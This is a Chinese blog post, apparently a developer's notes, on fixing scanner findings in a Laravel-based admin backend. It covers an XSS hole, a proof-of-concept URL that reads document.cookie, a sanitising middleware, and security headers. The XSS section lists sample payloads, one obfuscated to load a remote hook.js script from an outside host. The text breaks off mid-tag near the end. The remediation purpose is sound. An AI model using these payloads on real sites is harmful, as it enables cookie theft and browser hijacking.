@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 5.4.0">
+
+<link rel="preconnect" href="https://unpkg.com" crossorigin>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/favicon/safari-pinned-tab.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ni9ne.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="dsp后台代码安全修复跨站脚本XSS 漏洞页面 : http:&#x2F;&#x2F;192.168.1.251:9732&#x2F;customer&#x2F;item">
+<meta property="og:type" content="article">
+<meta property="og:title" content="管理后台安全修复">
+<meta property="og:url" content="https://ni9ne.github.io/2023/08/22/%E5%AE%89%E5%85%A8/%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/index.html">
+<meta property="og:site_name" content="NI9NE&#39;s Zone">
+<meta property="og:description" content="dsp后台代码安全修复跨站脚本XSS 漏洞页面 : http:&#x2F;&#x2F;192.168.1.251:9732&#x2F;customer&#x2F;item">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ca189595d78aaa4a30faa6df9379e477-3ea53e2.png">
+<meta property="og:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/edf5b941be9eda943b394f1025afaf2d-aefcdfd.png">
+<meta property="article:published_time" content="2023-08-22T14:35:43.000Z">
+<meta property="article:modified_time" content="2023-10-26T04:25:45.381Z">
+<meta property="article:author" content="NI9NE">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="后端">
+<meta property="article:tag" content="项目">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ca189595d78aaa4a30faa6df9379e477-3ea53e2.png">
+
+
+<link rel="canonical" href="https://ni9ne.github.io/2023/08/22/%E5%AE%89%E5%85%A8/%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ni9ne.github.io/2023/08/22/%E5%AE%89%E5%85%A8/%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/","path":"2023/08/22/安全/管理后台安全修复/","title":"管理后台安全修复"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>管理后台安全修复 | NI9NE's Zone</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">NI9NE's Zone</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">54</span></a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">112</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dsp%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.</span> <span class="nav-text">dsp后台代码安全修复</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS"><span class="nav-number">1.1.</span> <span class="nav-text">跨站脚本XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.1.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%93%BE%E6%8E%A5-%E5%B8%A6payload"><span class="nav-number">1.1.2.</span> <span class="nav-text">漏洞链接(带payload)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F"><span class="nav-number">1.1.3.</span> <span class="nav-text">漏洞修复方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8xss%E7%AE%80%E5%8D%95payload"><span class="nav-number">1.1.4.</span> <span class="nav-text">常用xss简单payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%B3%84%E9%9C%B2"><span class="nav-number">1.2.</span> <span class="nav-text">访问控制文件内容泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%9A%E8%AF%9DCookie%E4%B8%AD%E7%BC%BA%E5%B0%91secure%E5%B1%9E%E6%80%A7"><span class="nav-number">1.3.</span> <span class="nav-text">会话Cookie中缺少secure属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jQuery%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="nav-number">1.4.</span> <span class="nav-text">jQuery跨站脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-X-XSS-Protection%E7%BC%BA%E5%A4%B1"><span class="nav-number">1.5.</span> <span class="nav-text">HTTP X-XSS-Protection缺失</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AFoptions%E6%96%B9%E6%B3%95"><span class="nav-number">1.6.</span> <span class="nav-text">开启options方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%86%E7%A0%81%E5%AD%97%E6%AE%B5%E8%87%AA%E5%8A%A8%E5%AE%8C%E6%88%90%E5%A4%84%E4%BA%8E%E6%B4%BB%E5%8A%A8%E7%8A%B6%E6%80%81"><span class="nav-number">1.7.</span> <span class="nav-text">密码字段自动完成处于活动状态</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-X-Permitted-Cross-Domain-Policies%E7%BC%BA%E5%A4%B1"><span class="nav-number">1.8.</span> <span class="nav-text">HTTP X-Permitted-Cross-Domain-Policies缺失</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-Content-Security-Policy%E7%BC%BA%E5%A4%B1"><span class="nav-number">1.9.</span> <span class="nav-text">HTTP Content-Security-Policy缺失</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#X-Frame-Options-Header%E6%9C%AA%E9%85%8D%E7%BD%AE"><span class="nav-number">1.10.</span> <span class="nav-text">X-Frame-Options Header未配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="nav-number">1.11.</span> <span class="nav-text">敏感目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E9%94%99%E8%AF%AF"><span class="nav-number">1.12.</span> <span class="nav-text">Web应用程序错误</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A8%E5%8D%95%E9%9A%90%E8%97%8F%E5%9F%9F"><span class="nav-number">1.13.</span> <span class="nav-text">表单隐藏域</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Html-form%E8%A1%A8%E5%8D%95%E6%B2%A1%E6%9C%89CSRF%E9%98%B2%E6%8A%A4"><span class="nav-number">1.14.</span> <span class="nav-text">Html form表单没有CSRF防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-X-Content-Type-Options%E7%BC%BA%E5%A4%B1"><span class="nav-number">1.15.</span> <span class="nav-text">HTTP X-Content-Type-Options缺失</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">1.16.</span> <span class="nav-text">敏感文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-X-Download-Options%E7%BC%BA%E5%A4%B1"><span class="nav-number">1.17.</span> <span class="nav-text">HTTP X-Download-Options缺失</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="NI9NE"
+      src="/images/favicon/mstile-150x150.png">
+  <p class="site-author-name" itemprop="name">NI9NE</p>
+  <div class="site-description" itemprop="description">TECH OTAKU SAVE THE WORLD</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">112</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">54</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ni9ne" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ni9ne" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://gitee.com/ni9ne" title="Gitee → https:&#x2F;&#x2F;gitee.com&#x2F;ni9ne" rel="noopener" target="_blank"><i class="fab fa-git fa-fw"></i>Gitee</a>
+      </span>
+  </div>
+  <div class="cc-license site-overview-item animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://unpkg.com/@creativecommons/vocabulary@2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+  <a href="https://gitee.com/ni9ne" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ni9ne.github.io/2023/08/22/%E5%AE%89%E5%85%A8/%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/favicon/mstile-150x150.png">
+      <meta itemprop="name" content="NI9NE">
+      <meta itemprop="description" content="TECH OTAKU SAVE THE WORLD">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NI9NE's Zone">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          管理后台安全修复
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-22 22:35:43" itemprop="dateCreated datePublished" datetime="2023-08-22T22:35:43+08:00">2023-08-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%BC%80%E5%8F%91%E8%B5%84%E6%96%99/" itemprop="url" rel="index"><span itemprop="name">开发资料</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="dsp后台代码安全修复"><a href="#dsp后台代码安全修复" class="headerlink" title="dsp后台代码安全修复"></a>dsp后台代码安全修复</h1><h2 id="跨站脚本XSS"><a href="#跨站脚本XSS" class="headerlink" title="跨站脚本XSS"></a>跨站脚本XSS</h2><blockquote>
+<p>漏洞页面 : <code>http://192.168.1.251:9732/customer/item</code></p>
+</blockquote>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>通过查看代码, 发现接口获取的参数, 由框架做了实体化处理, 常用的闭合标签( <code>&gt;</code> / <code>&amp;#gt;</code>  / <code>&amp;#62;</code> ) 均无法闭合突破, 但代码中存在直接使用该请求参数的地方, 如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;&#123;<span class="subst">&#123;$search[&#x27;order_id&#x27;]&#125;</span>&#125;&quot;</span>&gt;<span class="number">0</span>)&#123;  <span class="comment"># 该代码当做字符串处理, 双引号及其他代码会被实体化</span></span><br><span class="line">  <span class="keyword">if</span>(&#123;&#123;<span class="variable">$search</span>[<span class="string">&#x27;status_show&#x27;</span>]&#125;&#125; == <span class="number">1</span>)&#123;	<span class="comment"># 漏洞点  </span></span><br><span class="line">    <span class="keyword">var</span> status = $(<span class="string">&#x27;#item_status&#x27;</span>).val();</span><br><span class="line">    url += <span class="string">&#x27;&amp;status=&#x27;</span>+status;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    url += <span class="string">&quot;&amp;status=&#123;<span class="subst">&#123;$search[&#x27;status&#x27;]&#125;</span>&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ca189595d78aaa4a30faa6df9379e477-3ea53e2.png" alt="1698128719082"></p>
+<p>点击搜索按钮后, 执行注入代码, 弹出prompt框, 存在注入点</p>
+<p><img src="https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/edf5b941be9eda943b394f1025afaf2d-aefcdfd.png" alt="1698128748205"></p>
+<h3 id="漏洞链接-带payload"><a href="#漏洞链接-带payload" class="headerlink" title="漏洞链接(带payload)"></a>漏洞链接(带payload)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.251:9732/customer/item/?status_show=console.log(document.cookie)&amp;order_id=1</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复方式"><a href="#漏洞修复方式" class="headerlink" title="漏洞修复方式"></a>漏洞修复方式</h3><p>1.修复漏洞点代码, 加上双引号</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;&#123;<span class="subst">&#123;$search[&#x27;order_id&#x27;]&#125;</span>&#125;&quot;</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="string">&quot;&#123;<span class="subst">&#123;$search[&#x27;status_show&#x27;]&#125;</span>&#125;&quot;</span> == <span class="number">1</span>)&#123;	<span class="comment"># 漏洞点  </span></span><br><span class="line">    <span class="keyword">var</span> status = $(<span class="string">&#x27;#item_status&#x27;</span>).val();</span><br><span class="line">    url += <span class="string">&#x27;&amp;status=&#x27;</span>+status;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    url += <span class="string">&quot;&amp;status=&#123;<span class="subst">&#123;$search[&#x27;status&#x27;]&#125;</span>&#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.新建过滤中间件, 对所有入参做处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan make:middleware XSS</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params">Request <span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	<span class="variable">$userInput</span> = <span class="variable">$request</span>-&gt;all();</span><br><span class="line">  	array_walk_recursive(<span class="variable">$userInput</span>, <span class="function"><span class="keyword">function</span> (<span class="params">&amp;<span class="variable">$userInput</span></span>) </span>&#123;</span><br><span class="line">  		<span class="variable">$userInput</span> = htmlspecialchars(<span class="variable">$userInput</span>, ENT_QUOTES);</span><br><span class="line">  	&#125;);</span><br><span class="line">	<span class="variable">$request</span>-&gt;merge(<span class="variable">$userInput</span>);</span><br><span class="line">  	<span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>) ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># kernel.php 中注册到路由中间件</span></span><br><span class="line"><span class="string">&#x27;XSS&#x27;</span> =&gt; \App\Http\Middleware\XSS::class,</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对应路由中使用</span></span><br><span class="line">Route::group([<span class="string">&#x27;middleware&#x27;</span> =&gt; <span class="string">&#x27;XSS&#x27;</span>],<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ... </span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用xss简单payload"><a href="#常用xss简单payload" class="headerlink" title="常用xss简单payload"></a>常用xss简单payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(111)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;prompt(111)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;image src=&quot;xxx.jpg&quot; onerror=&quot;alert(111)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img%20src=&quot;nonexistent.jpg&quot;%20onerror=&quot;eval(%27var%20s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);%27)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="访问控制文件内容泄露"><a href="#访问控制文件内容泄露" class="headerlink" title="访问控制文件内容泄露"></a>访问控制文件内容泄露</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx 配置  </span></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /xxx/.*</span> &#123; </span><br><span class="line">  <span class="attribute">deny</span> all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="会话Cookie中缺少secure属性"><a href="#会话Cookie中缺少secure属性" class="headerlink" title="会话Cookie中缺少secure属性"></a>会话Cookie中缺少secure属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laravel/config/session.php 中, 配置 secure 为 true  (前提是存在配置了https)</span><br></pre></td></tr></table></figure>
+
+<h2 id="jQuery跨站脚本"><a href="#jQuery跨站脚本" class="headerlink" title="jQuery跨站脚本"></a>jQuery跨站脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暂不处理</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-X-XSS-Protection缺失"><a href="#HTTP-X-XSS-Protection缺失" class="headerlink" title="HTTP X-XSS-Protection缺失"></a>HTTP X-XSS-Protection缺失</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line"><span class="comment"># 0：禁止XSS过滤。</span></span><br><span class="line"><span class="comment"># 1：启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</span></span><br><span class="line"><span class="comment"># 1; mode=block：启用 XSS 过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</span></span><br><span class="line"><span class="comment"># 1; report= (Chromium only)：启用 XSS 过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用 CSP report-uri指令的功能发送违规报告。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="开启options方法"><a href="#开启options方法" class="headerlink" title="开启options方法"></a>开启options方法</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="attribute">add_header</span> Access-Control-Allow-Methods <span class="string">&quot;GET, POST&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="密码字段自动完成处于活动状态"><a href="#密码字段自动完成处于活动状态" class="headerlink" title="密码字段自动完成处于活动状态"></a>密码字段自动完成处于活动状态</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># user.login</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_pwd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user_pwd&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">#member.pwdedit</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span 